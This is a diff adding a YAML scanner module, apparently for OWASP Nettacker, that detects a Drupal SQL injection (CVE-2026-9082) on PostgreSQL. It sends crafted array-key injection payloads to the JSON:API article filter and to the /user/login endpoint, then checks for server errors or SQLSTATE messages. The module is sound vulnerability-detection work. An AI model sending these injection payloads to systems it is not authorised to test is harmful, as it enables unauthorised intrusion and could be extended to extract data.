@@ -1,0 +1,92 @@
+info:
+  name: drupal_cve_2026_9082_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: >
+    CVE-2026-9082 is a critical SQL injection vulnerability in Drupal core's database abstraction layer. 
+    The flaw specifically impacts environments utilizing a PostgreSQL database backend. It stems from the unsafe processing of user-controlled PHP 
+    associative array keys, which are directly concatenated into SQL placeholder identifiers during condition translation rather than being properly sanitized.
+    This module attempts to identify the presence of this vulnerability through two different endpoints:
+    1. It exploits the /jsonapi/node/article endpoint to obtain an explicit SQL error that reveals the vulnerability, if JSON:API extension is enabled;
+    2. It attempts SQL injection via the /user/login endpoint, which if effective results in an internal server error response.
+    If at least one of these methods succeeds, the target is considered vulnerable.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-9082
+    - https://www.yeswehack.com/news/cve-2026-9082-postgresql-drupal
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - sqli
+    - drupal
+    - cisa_kev
+
+payloads:
+  - library: http
+    steps:
+      # if JSON:API is enabled, injection via this endpoint returns verbose SQL error message in response body (preferred method)
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/jsonapi/node/article?filter[title][path]=title&filter[title][operator]=IN&filter[title][value][0]=valid_in_elem&filter[title][value][0||(SELECT 6cd248caf8e64043a25bf05fab136ac4)]=placeholder"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          log: "detected via JSON:API endpoint"
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "500"
+              reverse: false
+            content:
+              regex: '(?i)SQLSTATE\[\d+\]'
+              reverse: false
+
+      # SQL injection via login triggers internal server error without verbose error message in response body, but is always available
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "application/json"
+        ssl: false
+        allow_redirects: false
+        json:
+          name:
+            "0": placeholder
+            "0||(SELECT 6cd248caf8e64043a25bf05fab136ac4)": placeholder
+          pass: placeholder
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/user/login?_format=json"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          log: "detected via /user/login endpoint"
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "500"
+              reverse: false
